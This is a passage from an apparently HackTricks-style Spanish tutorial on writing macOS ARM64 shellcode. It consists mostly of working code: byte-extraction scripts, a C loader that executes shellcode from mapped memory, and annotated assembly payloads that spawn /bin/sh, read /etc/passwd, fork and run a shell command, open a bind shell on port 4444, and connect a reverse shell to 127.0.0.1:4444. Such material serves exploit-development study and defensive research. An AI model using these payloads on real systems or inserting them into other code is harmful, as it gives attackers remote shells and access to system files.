# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para versiones más recientes de macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Código C para probar el shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tomado de [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) y explicado.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, por lo que el segundo argumento (x1) es un array de params (que en memoria significa un stack con las direcciones).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando con sh desde un fork para que el proceso principal no sea terminado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell desde [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) en **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Desde [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
